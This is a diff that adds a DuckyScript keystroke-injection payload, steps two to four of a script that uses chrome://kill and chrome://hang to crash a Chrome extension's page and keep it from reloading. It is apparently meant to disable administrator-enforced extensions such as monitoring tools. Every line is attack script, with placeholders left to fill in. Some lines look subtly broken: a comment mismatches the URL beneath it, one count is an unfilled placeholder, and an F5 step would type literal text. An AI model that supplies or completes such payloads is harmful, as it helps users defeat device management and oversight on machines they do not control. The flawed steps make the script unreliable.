@@ -1,0 +1,45 @@
+REM STEP TWO: Bookmark the required pages
+GUI d
+DELAY 500
+TAB
+TAB
+ENTER
+TAB
+BACKSPACE
+STRING chrome://kill
+GUI d
+DELAY 500
+TAB
+TAB
+ENTER
+TAB
+BACKSPACE
+STRING chrome://hang
+
+REM STEP THREE: Crash the extension page
+GUI l
+DELAY 500
+REM Replace "extension_page_here" with the actual URL of the extension's page
+STRING chrome-extension://.manifest.json
+ENTER
+DELAY 1000
+GUI d
+DELAY 500
+STRING chrome://kill
+ENTER
+
+REM STEP FOUR: Reload the extension page while spamming chrome://hang
+REM Replace "extension_page_here" with the actual URL of the extension's page
+REM Adjust the DELAY values as necessary based on your system's performance
+GUI r
+DELAY 500
+STRING extension_page_here
+ENTER
+DELAY 500
+REM Adjust the DELAY value based on your system's performance
+REPEAT number_of_reloads
+STRING chrome://hang
+ENTER
+DELAY 200
+STRING {F5}
+DELAY 200
